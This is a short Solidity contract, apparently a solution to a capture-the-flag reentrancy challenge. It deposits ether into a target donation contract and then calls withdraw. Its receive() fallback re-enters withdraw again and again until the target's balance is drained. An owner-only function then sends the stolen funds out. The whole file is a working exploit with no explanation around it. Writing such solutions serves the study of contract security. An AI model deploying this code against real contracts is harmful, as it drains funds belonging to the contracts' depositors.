// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IDonate {
  function donate(address _to) external payable;
  function withdraw(uint256 _amt) external;
}

contract SolveReentrance is Ownable {
  event DrainedAndTransfer();

  IDonate public donateContract;
  uint256 public donateAmt;

  constructor(address _target) Ownable(msg.sender) payable {
    require (msg.value > 0, "msg.value must be > 0");

    donateContract = IDonate(_target);
    donateContract.donate{ value: msg.value }(address(this));
    donateAmt = msg.value;
  }

  function withdrawAll() external {
    donateContract.withdraw(donateAmt);
  }

  function withdrawTo() external onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable {
    uint256 remainBalance = address(donateContract).balance;
    if (remainBalance > 0) {
      uint256 amount = donateAmt > remainBalance ? remainBalance : donateAmt;
      donateContract.withdraw(amount);
    }
  }
}
